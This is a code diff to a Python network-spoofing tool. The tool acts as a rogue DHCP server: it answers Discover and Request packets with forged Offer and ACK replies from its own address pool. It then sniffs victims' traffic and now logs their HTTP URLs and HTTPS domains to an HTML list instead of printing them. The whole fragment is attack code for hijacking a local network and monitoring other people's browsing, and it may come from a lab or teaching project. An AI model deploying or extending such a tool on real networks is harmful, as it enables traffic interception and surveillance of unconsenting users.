@@ -4,6 +4,7 @@ from socket import socket, htons, SOCK_RAW, AF_PACKET, inet_ntoa
 from spoofing.packet import parse
 from spoofing.assembler import DhcpPacket
 from spoofing.ippool import IpPool
+from spoofing.html import addListEntry
 import spoofing.html
 
 
@@ -62,17 +63,12 @@ def spoof_init():
                 print ('Detected a dhcp packet:')
                 if packet.ip.udp.dhcp.type == 1:
                     if packet.ip.udp.dhcp.dhcpOptions.type == b'\x01':
-                        print ('    >is a Discover')
-                        print("Sending Offer")
                         if not packet.ip.udp.dhcp.dhcpOptions.requested_ip:
                             packet.ip.udp.dhcp.dhcpOptions.requested_ip = ip_pool.get_ip_for(packet.origin_mac)
                         pacote = DhcpPacket(OFFER, packet.ip.udp.dhcp.transaction_id, packet.origin_mac,
                                             packet.ip.udp.dhcp.dhcpOptions.requested_ip).packet
-                        # print(pacote)
                         s.send(pacote)
                     elif packet.ip.udp.dhcp.dhcpOptions.type == b'\x03':
-                        print ('    >is a Request')
-                        print ('Sending ACK')
                         if not packet.ip.udp.dhcp.dhcpOptions.requested_ip:
                             packet.ip.udp.dhcp.dhcpOptions.requested_ip = ip_pool.get_ip_for(packet.origin_mac)
                         pacote = DhcpPacket(ACK, packet.ip.udp.dhcp.transaction_id, packet.origin_mac,
@@ -82,11 +78,11 @@ def spoof_init():
             try:
                 if packet.ip.tcp:
                     if packet.ip.tcp.http.URL:
-                        print(packet.ip.tcp.http.URL)
+                        addListEntry(packet.ip.tcp.http.time, packet.ip.destination, '(TODO)', packet.ip.tcp.http.URL)
             except AttributeError:
                 try:
                     if packet.ip.tcp:
                         if packet.ip.tcp.https.domain:
-                            print(packet.ip.tcp.https.domain)
+                            addListEntry (packet.ip.tcp.https.time, packet.ip.destination, '(TODO)',packet.ip.tcp.https.domain )
                 except AttributeError:
                     continue
